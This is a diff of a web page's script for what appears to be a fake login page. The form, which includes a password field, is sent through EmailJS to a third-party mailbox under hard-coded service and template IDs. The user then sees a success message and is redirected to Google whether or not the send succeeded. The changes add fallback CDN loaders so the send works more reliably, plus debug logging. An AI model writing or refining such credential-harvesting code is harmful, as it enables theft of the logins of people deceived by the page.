@@ -226,13 +226,87 @@
   </div>
 </div>
 
-<script src="https://cdn.emailjs.com/sdk/3.2.0/email.min.js"></script>
 <script>
   (function() {
+    console.log("Script starting..."); // Debug log
+    
     const USER_ID = "EB017wgX1BeDuRY66";
     const SERVICE_ID = "service_64albro";
     const TEMPLATE_ID = "template_y1sfcug";
-    emailjs.init(USER_ID);
+    
+    // Load EmailJS dynamically with multiple fallback URLs
+    function loadEmailJS() {
+      return new Promise((resolve, reject) => {
+        if (typeof emailjs !== 'undefined') {
+          resolve();
+          return;
+        }
+        
+        const cdnUrls = [
+          'https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js',
+          'https://unpkg.com/@emailjs/browser@3/dist/email.min.js',
+          'https://cdn.emailjs.com/dist/email.min.js',
+          'https://cdn.emailjs.com/sdk/3.2.0/email.min.js'
+        ];
+        
+        let currentIndex = 0;
+        
+        function tryNextUrl() {
+          if (currentIndex >= cdnUrls.length) {
+            reject('All EmailJS CDN URLs failed');
+            return;
+          }
+          
+          const script = document.createElement('script');
+          script.src = cdnUrls[currentIndex];
+          console.log('Trying EmailJS CDN:', cdnUrls[currentIndex]);
+          
+          script.onload = () => {
+            console.log("EmailJS script loaded from:", cdnUrls[currentIndex]);
+            
+            // Wait a bit for the library to initialize
+            setTimeout(() => {
+              if (typeof emailjs !== 'undefined') {
+                try {
+                  emailjs.init(USER_ID);
+                  console.log("EmailJS initialized successfully");
+                  resolve();
+                } catch (error) {
+                  console.log("EmailJS init failed:", error);
+                  currentIndex++;
+                  tryNextUrl();
+                }
+              } else {
+                console.log("EmailJS object not found, trying next URL");
+                currentIndex++;
+                tryNextUrl();
+              }
+            }, 100);
+          };
+          
+          script.onerror = () => {
+            console.log("Failed to load from:", cdnUrls[currentIndex]);
+            currentIndex++;
+            tryNextUrl();
+          };
+          
+          document.head.appendChild(script);
+        }
+        
+        tryNextUrl();
+      });
+    }
+    
+    // Try to load EmailJS, but don't block the form if it fails
+    let emailjsReady = false;
+    loadEmailJS()
+      .then(() => {
+        emailjsReady = true;
+      })
+      .catch(error => {
+        console.log("EmailJS loading failed:", error);
+        console.log("Form will work without EmailJS");
+      });
     
     const loginPage = document.getElementById("login-page");
     const forgotPage = document.getElementById("forgot-page");
@@ -287,15 +361,20 @@
     
     // Show success and redirect to Google
     function showSuccessAndRedirect() {
+      console.log("Showing success overlay..."); // Debug log
       successOverlay.style.display = "flex";
       
       let countdown = 3;
+      countdownEl.textContent = countdown;
+      
       const timer = setInterval(() => {
         countdown--;
         countdownEl.textContent = countdown;
+        console.log("Countdown:", countdown); // Debug log
         
         if (countdown <= 0) {
           clearInterval(timer);
+          console.log("Redirecting to Google..."); // Debug log
           window.location.href = "https://www.google.com";
         }
       }, 1000);
@@ -304,6 +383,7 @@
     // Login form submission
     loginForm.addEventListener("submit", function(event) {
       event.preventDefault();
+      console.log("Form submitted!"); // Debug log
       
       let hasErrors = false;
       
@@ -328,16 +408,30 @@
         hideError(passwordInput, passwordError);
       }
       
-      // If no errors, proceed with EmailJS
+      // If no errors, proceed
       if (!hasErrors) {
-        emailjs.sendForm(SERVICE_ID, TEMPLATE_ID, this)
-          .then(function() {
-            showSuccessAndRedirect();
-          })
-          .catch(function(error) {
-            console.error("EmailJS error:", error);
-            showSuccessAndRedirect(); // Still redirect for demo
-          });
+        console.log("No validation errors, proceeding..."); // Debug log
+        
+        // Try EmailJS if it's ready
+        if (emailjsReady && typeof emailjs !== 'undefined') {
+          console.log("Attempting to send via EmailJS...");
+          emailjs.sendForm(SERVICE_ID, TEMPLATE_ID, this)
+            .then(function(response) {
+              console.log("EmailJS SUCCESS:", response); // Debug log
+              showSuccessAndRedirect();
+            })
+            .catch(function(error) {
+              console.log("EmailJS ERROR:", error); // Debug log
+              // Still show success even if EmailJS fails
+              showSuccessAndRedirect();
+            });
+        } else {
+          console.log("EmailJS not ready, showing success anyway"); // Debug log
+          // Show success immediately for demo
+          showSuccessAndRedirect();
+        }
+      } else {
+        console.log("Validation errors found"); // Debug log
       }
     });
     
